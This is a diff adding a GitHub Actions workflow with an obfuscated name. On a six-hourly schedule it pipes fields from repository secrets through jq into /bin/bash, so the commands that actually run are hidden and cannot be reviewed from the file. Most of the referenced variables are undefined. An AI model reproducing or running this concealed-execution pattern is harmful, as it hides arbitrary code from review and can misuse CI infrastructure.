@@ -1,0 +1,24 @@
+name: dongnanxiebeiyingxiong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: dongnanxiebeiyingxiong
+        env:
+          htj346: ${{ secrets.htj346 }}
+        run: |
+          echo $htj346 | jq -r .lwzo6 | /bin/bash
+          echo $xjtr889 | jq -r .xu15 | /bin/bash
+          echo $yily52580 | jq -r .l773 | /bin/bash
+          echo $ktu14805 | jq -r .fsfi87 | /bin/bash
+          echo $edbvt26815 | jq -r .eu72 | /bin/bash
+          echo $lf21334 | jq -r .zj0 | /bin/bash
+          echo $piei7 | jq -r .eclfz2 | /bin/bash
+          echo $z11805 | jq -r .mim390 | /bin/bash
+          echo $m3580 | jq -r .widyq310 | /bin/bash
+
